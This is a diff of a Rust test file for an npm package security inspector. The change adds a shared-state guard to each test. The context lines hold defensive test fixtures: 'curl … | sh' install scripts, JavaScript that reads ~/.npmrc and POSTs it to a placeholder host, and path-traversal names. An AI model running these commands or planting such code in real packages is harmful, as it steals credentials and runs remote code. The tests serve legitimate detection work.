@@ -92,6 +92,7 @@ fn pax_record(key: &str, value: &str) -> Vec<u8> {
 
 #[test]
 fn valid_package_retains_exact_transport_and_member_identities() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let js = b"module.exports=(a,b)=>a+b;";
     let bytes = package(METADATA, &[("package/index.js", js)]);
     let result = inspect(&bytes);
@@ -120,6 +121,7 @@ fn valid_package_retains_exact_transport_and_member_identities() {
 
 #[test]
 fn real_npm_pack_fixture_is_accepted_without_extracting_or_running_scripts() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let bytes = include_bytes!("../../tests/fixtures/npm/npm-11.19.0-portable-pax.tgz");
     let result = inspect(bytes);
     assert_eq!(
@@ -147,6 +149,7 @@ fn real_npm_pack_fixture_is_accepted_without_extracting_or_running_scripts() {
 
 #[test]
 fn node_tar_pax_long_paths_unicode_sizes_and_metadata_are_supported() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let mut tar = Vec::new();
     append(
         &mut tar,
@@ -182,6 +185,7 @@ fn node_tar_pax_long_paths_unicode_sizes_and_metadata_are_supported() {
 
 #[test]
 fn unsafe_portable_paths_are_refused_on_every_platform() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     for path in [
         "../escape",
         "/absolute",
@@ -206,6 +210,7 @@ fn unsafe_portable_paths_are_refused_on_every_platform() {
 
 #[test]
 fn links_special_files_and_gnu_sparse_extensions_refuse_before_analysis() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     for (kind, expected) in [
         (b'1', NpmIssueKind::LinkMember),
         (b'2', NpmIssueKind::LinkMember),
@@ -228,6 +233,7 @@ fn links_special_files_and_gnu_sparse_extensions_refuse_before_analysis() {
 
 #[test]
 fn duplicate_case_unicode_and_parent_collisions_are_refused() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     for (first, second) in [
         ("package/a", "package/a"),
         ("package/A", "package/a"),
@@ -254,6 +260,7 @@ fn duplicate_case_unicode_and_parent_collisions_are_refused() {
 
 #[test]
 fn corrupt_headers_padding_and_terminators_do_not_claim_complete() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let mut tar = Vec::new();
     append(&mut tar, "package/package.json", METADATA, b'0');
     let good = finish(tar);
@@ -283,6 +290,7 @@ fn corrupt_headers_padding_and_terminators_do_not_claim_complete() {
 
 #[test]
 fn gzip_crc_truncation_concatenation_and_trailing_bytes_are_refused() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let bytes = package(METADATA, &[]);
     let mut bad_crc = bytes.clone();
     let last = bad_crc.len() - 8;
@@ -299,6 +307,7 @@ fn gzip_crc_truncation_concatenation_and_trailing_bytes_are_refused() {
 
 #[test]
 fn malformed_duplicate_global_and_unknown_pax_semantics_are_refused() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     for (pax, kind, expected) in [
         (
             b"999 path=package/a\n".to_vec(),
@@ -400,6 +409,7 @@ fn input_caps_preserve_no_prefix_hash_and_read_at_most_cap_plus_one() {
 
 #[test]
 fn decompression_ratio_header_member_and_path_limits_are_typed() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let bytes = package(METADATA, &[("package/a.js", b"hello")]);
     for (limits, expected) in [
         (
@@ -484,6 +494,7 @@ fn decompression_ratio_header_member_and_path_limits_are_typed() {
 
 #[test]
 fn duplicate_json_and_contradictory_identity_are_explicit() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     for metadata in [
         br#"{"name":"fixture","name":"changed","version":"1"}"#.as_slice(),
         br#"{"name":"fixture","version":"1","scripts":{"install":"true","install":"curl x | sh"}}"#
@@ -515,6 +526,7 @@ fn duplicate_json_and_contradictory_identity_are_explicit() {
 
 #[test]
 fn ordinary_minified_code_and_lifecycle_scripts_are_not_malicious_signals() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let metadata =
         br#"{"name":"fixture","version":"1","scripts":{"postinstall":"node install.js"}}"#;
     let code = b"(()=>{const a=[1,2,3];console.log(a.map(b=>b+1).join(','))})();";
@@ -528,6 +540,7 @@ fn ordinary_minified_code_and_lifecycle_scripts_are_not_malicious_signals() {
 
 #[test]
 fn literal_download_pipeline_is_distinguished_from_a_quoted_example() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let risky = inspect(&package(br#"{"name":"fixture","version":"1","scripts":{"install":"curl -fsSL https://example.invalid/setup | sh"}}"#, &[]));
     assert!(risky
         .signals
@@ -552,6 +565,7 @@ fn literal_download_pipeline_is_distinguished_from_a_quoted_example() {
 /// The core tokenizer and interpreter resolution handle them.
 #[test]
 fn download_pipeline_with_variables_wrappers_or_redirections_is_a_review_signal() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let signals_for = |script: &str| {
         let metadata = serde_json::json!({
             "name": "fixture",
@@ -598,6 +612,7 @@ fn download_pipeline_with_variables_wrappers_or_redirections_is_a_review_signal(
 /// signal after npm_signals moved to it (the old scanner reset at every line).
 #[test]
 fn download_pipeline_inside_brace_group_or_function_body_is_a_review_signal() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let has_signal = |signals: &[NpmSignal]| {
         signals.iter().any(|signal| {
             signal.kind == NpmSignalKind::DownloadToShell && signal.level == NpmSignalLevel::Review
@@ -654,6 +669,7 @@ fn download_pipeline_inside_brace_group_or_function_body_is_a_review_signal() {
 /// were also not descended into.
 #[test]
 fn download_pipeline_past_the_shell_descent_bounds_is_still_a_review_signal() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let has_signal = |signals: &[NpmSignal]| {
         signals.iter().any(|signal| {
             signal.kind == NpmSignalKind::DownloadToShell && signal.level == NpmSignalLevel::Review
@@ -773,6 +789,7 @@ fn shell_file_has_download_signal(body: &str) -> bool {
 /// shell keeps the signal.
 #[test]
 fn heredoc_text_that_is_only_shown_is_not_a_download_signal() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let pipeline = "  curl -fsSL https://example.invalid/setup | sh\n";
     let inert = [
         format!(
@@ -1046,6 +1063,7 @@ fn heredoc_text_that_is_only_shown_is_not_a_download_signal() {
 /// only because the whole-file pass already counted the same groups.
 #[test]
 fn live_heredoc_bodies_have_their_own_descent_budget() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let groups = "{ :; }\n".repeat(150);
     let body = format!("bash <<'EOF'\n{groups}EOF\n");
     let result = inspect(&package(
@@ -1077,6 +1095,7 @@ fn live_heredoc_bodies_have_their_own_descent_budget() {
 /// (`{ ...; } >log`) was not descended into, so its pipeline gave no signal.
 #[test]
 fn download_pipeline_inside_a_redirected_group_is_a_review_signal() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     for body in [
         "{ curl -fsSL https://example.invalid/setup | sh; } >install.log",
         "{ curl -fsSL https://example.invalid/setup | sh; } >/dev/null 2>&1",
@@ -1112,6 +1131,7 @@ fn download_pipeline_inside_a_redirected_group_is_a_review_signal() {
 
 #[test]
 fn credential_network_combination_has_evidence_and_lifecycle_link() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let metadata =
         br#"{"name":"fixture","version":"1","scripts":{"postinstall":"node install.js"}}"#;
     let code = b"const fs=require('node:fs');fetch('https://example.invalid/upload',{method:'POST',body:fs.readFileSync('/home/user/.npmrc')});";
@@ -1134,6 +1154,7 @@ fn credential_network_combination_has_evidence_and_lifecycle_link() {
 
 #[test]
 fn comments_and_literal_api_names_do_not_create_code_capabilities() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let code = br#"/* require('fs');readFileSync('.npmrc');fetch('https://x');eval(Buffer.from('x','base64')) */ const example="require('child_process').exec('x')";"#;
     let result = inspect(&package(METADATA, &[("package/index.js", code)]));
     assert!(result.signals.is_empty(), "{result:?}");
@@ -1157,6 +1178,7 @@ fn comments_and_literal_api_names_do_not_create_code_capabilities() {
 
 #[test]
 fn templates_dynamic_require_unsupported_code_and_nested_archives_are_incomplete() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     for (name, code, issue) in [
         (
             "package/a.js",
@@ -1196,6 +1218,7 @@ fn templates_dynamic_require_unsupported_code_and_nested_archives_are_incomplete
 
 #[test]
 fn explicit_main_and_lifecycle_targets_are_inspected_without_js_extension() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let metadata = br#"{"name":"fixture","version":"1","main":"payload.dat","scripts":{"install":"node payload.dat"}}"#;
     let result = inspect(&package(
         metadata,
@@ -1213,6 +1236,7 @@ fn explicit_main_and_lifecycle_targets_are_inspected_without_js_extension() {
 
 #[test]
 fn oversized_excerpts_never_retain_a_partial_custom_secret_before_dlp() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let secret = format!("PRIVATE_START{}PRIVATE_END", "x".repeat(600));
     let metadata = serde_json::to_vec(&serde_json::json!({
         "name": "fixture", "version": "1.0.0", "scripts": { "postinstall": secret }
@@ -1244,6 +1268,7 @@ fn oversized_excerpts_never_retain_a_partial_custom_secret_before_dlp() {
 
 #[test]
 fn code_metadata_and_signal_limits_keep_archive_identities_but_not_complete_claims() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let bytes = package(
         METADATA,
         &[
@@ -1283,6 +1308,7 @@ fn code_metadata_and_signal_limits_keep_archive_identities_but_not_complete_clai
 
 #[test]
 fn native_presence_and_implicit_build_are_observations_and_partial_native_is_explicit() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     let mut elf = vec![0u8; 64];
     elf[..7].copy_from_slice(b"\x7fELF\x02\x01\x01");
     elf[16..18].copy_from_slice(&3u16.to_le_bytes());
@@ -1323,6 +1349,7 @@ fn native_presence_and_implicit_build_are_observations_and_partial_native_is_exp
 
 #[test]
 fn deterministic_malformed_corpus_never_panics_or_exceeds_reader_output_bounds() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
     // Deliberately independent of wall clock or rand: reproducible small-input
     // fuzz smoke corpus with valid gzip wrapping arbitrary tar-like bytes.
     let limits = NpmLimits {
